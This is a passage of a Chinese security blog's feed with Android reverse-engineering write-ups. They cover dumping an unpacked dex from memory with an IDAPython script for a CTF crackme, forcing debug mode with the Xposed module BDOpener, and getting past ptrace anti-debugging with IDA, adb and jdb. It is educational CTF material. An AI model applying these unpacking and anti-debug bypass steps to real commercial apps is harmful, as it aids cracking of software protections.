      <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><a href="http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/" target="_blank" rel="noopener">http://www.wjdiankong.cn/android中的apk的加固加壳原理解析和实现/</a><br><a href="http://blog.csdn.net/jiangwei0910410003/article/details/48104581" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/48104581</a></p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/jscrack.apk</a><br>可能是因为赛题是14年的，有点老了，所以在5.0.1上运行失败，用android 4.4.4就可以运行了。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h3><p>现在市场中加固apk的方式一般就是两种：一种是对源apk整体做一个加固，放到指定位置，运行的时候在解密动态加载，还有一种是对so进行加固，在so加载内存的时候进行解密释放。我们今天主要看第一种加固方式，就是对apk整体进行加固。<br>当我们发现apk中主要的类都没有了，肯定是apk被加固了，加固的源程序肯定是在本地，一般会有这么几个地方需要注意的：<br>1、应用程序的asset目录，我们知道这个目录是不参与apk的资源编译过程的，所以很多加固的应用喜欢把加密之后的源apk放到这里<br>2、把源apk加密放到壳的dex文件的尾部，这个肯定不是我们这里的案例，但是也有这样的加固方式，<strong>这种加固方式会发现使用dex2jar工具解析dex是失败的</strong>，我们这时候就知道了，肯定对dex做了手脚<br>3、把源apk加密放到so文件中，这个就比较难了，一般都是把源apk进行拆分，存到so文件中，分析难度会加大的。</p><h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><p>不管上层怎么加固，最终加载到内存的dex肯定不是加固的，所以这个dex就是我们想要的.</p><h3 id="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex"><a href="#为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex" class="headerlink" title="为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?"></a>为什么在dvmDexFileOpenPartial下断点就能dump出完全加载到内存的dex?</h3><p>dalvik虚拟机会把dex文件优化为odex文件,而优化的源代码为<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Main entry point.  Decide where to go.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--zip"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromZip(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--dex"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> fromDex(argc, argv);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--preopt"</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> preopt(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中fromzip和preopt都会调用processZipFile先将dex文件提取出来,fromDex则直接调用dvmContinueOptimization优化.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Common functionality for normal device-side processing as well as</span></span><br><span class="line"><span class="comment"> * preoptimization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">processZipFile</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd, <span class="keyword">const</span> <span class="keyword">char</span>* zipName,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *dexoptFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">    <span class="keyword">int</span> result = extractAndProcessZip(zipFd, cacheFd, zipName, isBootstrap,</span><br><span class="line">            bcp, dexoptFlags);</span><br><span class="line">    <span class="built_in">free</span>(bcpCopy);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在extractAndProcessZip中处理zip文件并将dex提取出来,随后调用优化函数<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extract "classes.dex" from zipFd into "cacheFd", leaving a little space</span></span><br><span class="line"><span class="comment"> * up front for the DEX optimization header.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">extractAndProcessZip</span><span class="params">(<span class="keyword">int</span> zipFd, <span class="keyword">int</span> cacheFd,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* debugFileName, <span class="keyword">bool</span> isBootstrap, <span class="keyword">const</span> <span class="keyword">char</span>* bootClassPath,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* dexoptFlagStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Open the zip archive, find the DEX entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipPrepArchive(zipFd, debugFileName, &amp;zippy) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: unable to open zip archive '%s'"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    zipEntry = dexZipFindEntry(&amp;zippy, kClassesDex);</span><br><span class="line">    <span class="keyword">if</span> (zipEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive '%s' does not include %s"</span>,</span><br><span class="line">            debugFileName, kClassesDex);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract some info about the zip entry.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipGetEntryInfo(&amp;zippy, zipEntry, <span class="literal">NULL</span>, &amp;uncompLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;modWhen, &amp;crc32) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: zip archive GetEntryInfo failed on %s"</span>, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    uncompLen = uncompLen;</span><br><span class="line">    modWhen = modWhen;</span><br><span class="line">    crc32 = crc32;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract the DEX data into the cache file at the current offset.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dexZipExtractEntryToFile(&amp;zippy, zipEntry, cacheFd) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGW(<span class="string">"DexOptZ: extraction of %s from %s failed"</span>,</span><br><span class="line">            kClassesDex, debugFileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prep the VM and perform the optimization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (dvmPrepForDexOpt(bootClassPath, dexOptMode, verifyMode,</span><br><span class="line">            dexoptFlags) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"DexOptZ: VM init failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//vmStarted = 1;</span></span><br><span class="line">    <span class="comment">/* do the optimization */</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmContinueOptimization(cacheFd, dexOffset, uncompLen, debugFileName,</span><br><span class="line">            modWhen, crc32, isBootstrap))</span><br><span class="line">    &#123;</span><br><span class="line">        ALOGE(<span class="string">"Optimization failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dvmContinueOptimization函数位于/dalvik/vm/analysis/DexPrepare.cpp文件,其中调用了dvmDexFileOpenPartial.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do the actual optimization. This is executed in the dexopt process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For best use of disk/memory, we want to extract once and perform</span></span><br><span class="line"><span class="comment"> * optimizations in place. If the file has to expand or contract</span></span><br><span class="line"><span class="comment"> * to match local structure padding/alignment expectations, we want</span></span><br><span class="line"><span class="comment"> * to do the rewrite as part of the extract, rather than extracting</span></span><br><span class="line"><span class="comment"> * into a temp file and slurping it back out. (The structure alignment</span></span><br><span class="line"><span class="comment"> * is currently correct for all platforms, and this isn't expected to</span></span><br><span class="line"><span class="comment"> * change, so we should be okay with having it already extracted.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns "true" on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dvmContinueOptimization</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> dexOffset, <span class="keyword">long</span> dexLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* fileName, u4 modWhen, u4 crc, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">        success = rewriteDex(((u1*) mapAddr) + dexOffset, dexLength,</span><br><span class="line">                    doVerify, doOpt, &amp;pClassLookup, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (success) &#123;</span><br><span class="line">            DvmDex* pDvmDex = <span class="literal">NULL</span>;</span><br><span class="line">            u1* dexAddr = ((u1*) mapAddr) + dexOffset;</span><br><span class="line">            <span class="keyword">if</span> (dvmDexFileOpenPartial(dexAddr, dexLength, &amp;pDvmDex) != <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Unable to create DexFile"</span>);</span><br><span class="line">                success = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dvmDexFileOpenPartial调用了dexFileParse,用来解析内存中优化过或未优化过的dex文件,返回dexFile结构.<br>所以此时dex文件已经被加载进内存,就可以dump出来了.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a DexFile structure for a "partial" DEX. This is one that is in</span></span><br><span class="line"><span class="comment"> * the process of being optimized. The optimization header isn't finished</span></span><br><span class="line"><span class="comment"> * and we won't have any of the auxillary data tables, so we have to do</span></span><br><span class="line"><span class="comment"> * the initialization slightly differently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns nonzero on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenPartial</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* addr, <span class="keyword">int</span> len, DvmDex** ppDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DvmDex* pDvmDex;</span><br><span class="line">    DexFile* pDexFile;</span><br><span class="line">    <span class="keyword">int</span> parseFlags = kDexParseDefault;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* -- file is incomplete, new checksum has not yet been calculated</span></span><br><span class="line"><span class="comment">    if (gDvm.verifyDexChecksum)</span></span><br><span class="line"><span class="comment">        parseFlags |= kDexParseVerifyChecksum;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pDexFile = dexFileParse((u1*)addr, len, parseFlags);</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">"DEX parse failed"</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="赛题分析"><a href="#赛题分析" class="headerlink" title="赛题分析"></a>赛题分析</h2><h3 id="jeb打开apk，查看Manifest"><a href="#jeb打开apk，查看Manifest" class="headerlink" title="jeb打开apk，查看Manifest"></a>jeb打开apk，查看Manifest</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bvqfxcnj31je0ngacl.jpg" alt=""></p><h3 id="反编译查看源代码"><a href="#反编译查看源代码" class="headerlink" title="反编译查看源代码"></a>反编译查看源代码</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fo0bzdzyitj31d00oewg7.jpg" alt=""></p><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>asset目录中的jar文件被处理了，打不开，也不知道处理逻辑<br>libs目录中的三个so文件，唯一加载了libmobisec.so文件了<br>所以说被加固的源程序可能存在于so文件，也可能存在于asset文件里。</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><h3 id="得到libdvm-so文件"><a href="#得到libdvm-so文件" class="headerlink" title="得到libdvm.so文件"></a>得到libdvm.so文件</h3><p><code>adb pull /system/lib/libdvm.so</code></p><h3 id="在dvmDexFileOpenPartial下断点"><a href="#在dvmDexFileOpenPartial下断点" class="headerlink" title="在dvmDexFileOpenPartial下断点"></a>在dvmDexFileOpenPartial下断点</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0c9qazoaj30x409ltck.jpg" alt=""></p><h3 id="IDA-attach并断下"><a href="#IDA-attach并断下" class="headerlink" title="IDA attach并断下"></a>IDA attach并断下</h3><p>adb shell am start -D -n com.ali.tg.testapp/.MainActivity<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cmoer7bj30zl073gp5.jpg" alt=""><br>dvmDexFileOpenPartial函数的第一个参数就是dex内存起始地址，第二个参数就是dex大小。<br>R0:0x753EF008<br>R1:0x000941FC</p><h3 id="dump脚本"><a href="#dump脚本" class="headerlink" title="dump脚本"></a>dump脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">start_addr=<span class="number">0x753EF008</span></span><br><span class="line">fike_len=<span class="number">0x000941FC</span></span><br><span class="line">data=idaapi.dbg_read_memory(start_addr,fike_len)</span><br><span class="line">f=open(<span class="string">r'dump.dex'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0cpgd28kj30zu0n4wjs.jpg" alt=""></p><h3 id="反编译dex为smali，进行分析"><a href="#反编译dex为smali，进行分析" class="headerlink" title="反编译dex为smali，进行分析"></a>反编译dex为smali，进行分析</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fo0d78f8gsj31im0xy41l.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BDOpener hook debugger=&quot;true&quot;</title>
      <link href="/2018/01/30/android_trick1/"/>
      <url>/2018/01/30/android_trick1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在很多APK都设置android:debugable=”false”，经常需要改xml的application后重打包。<br>所以这里使用Xposed来Hook配置信息修改debugger值。<br>使用前手机已root,且安装Xposed,然后在“模块”中勾选BDOpener<br><a href="https://security.tencent.com/index.php/opensource/detail/17" target="_blank" rel="noopener">BDOpener下载链接</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在手机上安装待调试的程序，然后在开发者选项设置里“选择待调试的应用程序”选项，勾选“等待调试器”选项，之后打开调试程序。<br>待调试器加载它。<br>使用日志：<img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnygwv23j9j316c0b20yl.jpg" alt=""></p><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><p>关于动态调试可以参考我的这篇文章：<br><a href="http://eternalsakura13.com/2018/01/30/ali_re2/">http://eternalsakura13.com/2018/01/30/ali_re2/</a><br>有变动的地方就是不需要修改debugger值后重打包apk，也不再需要用<code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code>来启动要调试的apk<br>只需要按照上面描述的方法在手机上手动按一次就好了。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhc72031j30c20kumzw.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhd13d8bj30by0l8wfw.jpg" alt=""></p><h2 id="一些操作"><a href="#一些操作" class="headerlink" title="一些操作"></a>一些操作</h2><h3 id="手动打开apk"><a href="#手动打开apk" class="headerlink" title="手动打开apk"></a>手动打开apk</h3><p>日志<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnyh5t87s7j314k07mq7g.jpg" alt=""></p><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnyh1piu9tj30pe09b768.jpg" alt=""></p><h3 id="设置好IDA-process-option并attach上去，断在libc里"><a href="#设置好IDA-process-option并attach上去，断在libc里" class="headerlink" title="设置好IDA process option并attach上去，断在libc里"></a>设置好IDA process option并attach上去，断在libc里</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnyh2jf5wmj30fi040dgf.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnyh319tohj30g8057dgz.jpg" alt=""></p><h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br>按下F9，顺利断下。<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyh5au2w1j30ce03wwf1.jpg" alt=""></p><h3 id="再次调试"><a href="#再次调试" class="headerlink" title="再次调试"></a>再次调试</h3><p>IDA调试结束后，apk回到waiting for debugger状态，等待下一次被attach<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnyhd13d8bj30by0l8wfw.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>阿里移动安全挑战赛第二题writeup</title>
      <link href="/2018/01/30/ctf_ali2/"/>
      <url>/2018/01/30/ctf_ali2/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk</a></p><h2 id="反调试原理"><a href="#反调试原理" class="headerlink" title="反调试原理"></a>反调试原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。<br>在执行系统调用之前，内核会先检查当前进程是否处于被“跟踪”(traced)的状态。如果是的话，内核<strong>暂停当前进程并将控制权交给跟踪进程</strong>，使跟踪进程得以察看或者修改被跟踪进程的寄存器。</p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>用fopen打开/proc/<pid>/status文件读取其中的TracerPid值来检测自己的进程是否被attach，<br>TracerPid如果为0说明没有别的进程在调试这个进程，如果不为0说明有程序在调试</pid></p><h3 id="反调试程序执行时机"><a href="#反调试程序执行时机" class="headerlink" title="反调试程序执行时机"></a>反调试程序执行时机</h3><ul><li>.init_array是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的</li><li>JNI_OnLoad是so被System.loadLibrary调用的时候执行，它的时机要早于哪些native方法执行，但是没有.init_array时机早</li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="连接到实体机，打开监听"><a href="#连接到实体机，打开监听" class="headerlink" title="连接到实体机，打开监听"></a>连接到实体机，打开监听</h3><p><code>./android_server</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny05kit55j30et03x0tc.jpg" alt=""><br>这里开始监听设备的23946端口。</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>如果要想让IDA和这个android_server进行通信，那么必须让PC端的IDA也连上这个端口<br>adb forward tcp:远端设备端口号(进行调试程序端) tcp:本地设备端口(被调试程序端)<br><code>adb forward tcp:23946 tcp:23946</code></p><h3 id="打开要调试的apk，找到入口"><a href="#打开要调试的apk，找到入口" class="headerlink" title="打开要调试的apk，找到入口"></a>打开要调试的apk，找到入口</h3><p><code>adb shell dumpsys activity top</code><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0bll6ovj30gi04nt9o.jpg" alt=""></p><h3 id="打开monitor"><a href="#打开monitor" class="headerlink" title="打开monitor"></a>打开monitor</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0c5a6y0j31kw0m3nio.jpg" alt=""></p><h3 id="启动apk"><a href="#启动apk" class="headerlink" title="启动apk"></a>启动apk</h3><p><code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code><br>设备将处于一个Waiting For Debugger的状态</p><h3 id="在要调试的函数下断点，这里我们在JNI-OnLoad下断。"><a href="#在要调试的函数下断点，这里我们在JNI-OnLoad下断。" class="headerlink" title="在要调试的函数下断点，这里我们在JNI_OnLoad下断。"></a>在要调试的函数下断点，这里我们在JNI_OnLoad下断。</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0l03rv2j31kw0n54d1.jpg" alt=""></p><h3 id="设置IDA"><a href="#设置IDA" class="headerlink" title="设置IDA"></a>设置IDA</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0eyg040j318a14otra.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0fqqwhcj30ue0nuq8u.jpg" alt=""></p><h3 id="attach进程"><a href="#attach进程" class="headerlink" title="attach进程"></a>attach进程</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0hgcahsj30ks0netg9.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0gyl380j30xc0qw7c7.jpg" alt=""><br>断在libc.so<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0i5xmklj31h80ponbm.jpg" alt=""><br><strong>tips:这里为什么会断在libc.so中呢</strong><br>android系统中libc是c层中最基本的函数库，libc中封装了io、文件、socket等基本系统调用。所有上层的调用都需要经过libc封装层。所以libc.so是最基本的，所以会断在这里，而且我们还需要知道一些常用的系统so,比如linker</p><h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0nb9v75j30g001wglx.jpg" alt=""><br>按下F9执行程序<br>弹出窗口，这里是问apk里的so文件和我们正在调试的是否是同一个，当然是same<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0nt58mtj31kw0b647j.jpg" alt=""><br>正常情况会出现:<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0ovayd9j30fm02ymxn.jpg" alt=""><br>报错处理：<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0q9s9rhj30gb0ajjtg.jpg" alt=""></p><ul><li>打开ddms尝试.</li><li>检查调试的app配置文件中是否有android:debuggable=”true”，导致不能调试。若无则在清单文件的application中加上,重新打包即可.<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0r84fb2j31jk0esq4l.jpg" alt=""><h3 id="JNI-OnLoad中单步调试找到check点"><a href="#JNI-OnLoad中单步调试找到check点" class="headerlink" title="JNI_OnLoad中单步调试找到check点"></a>JNI_OnLoad中单步调试找到check点</h3>函数顺利断下<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0rp83etj31fc0ou4d8.jpg" alt=""><br>F8单步找到Check点<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnxzwyv4xkj316w0eyk0b.jpg" alt=""><br>执行<code>BLX R7</code>之后就跳入libc中断<br><img 